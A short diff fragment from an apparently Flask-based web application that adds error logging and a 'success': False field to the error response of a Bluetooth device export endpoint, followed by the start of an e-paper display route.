-        return jsonify({'error': str(e)}), 500
+        logger.error(f"Error exporting Bluetooth devices: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/epaper-display')
 def get_epaper_display():
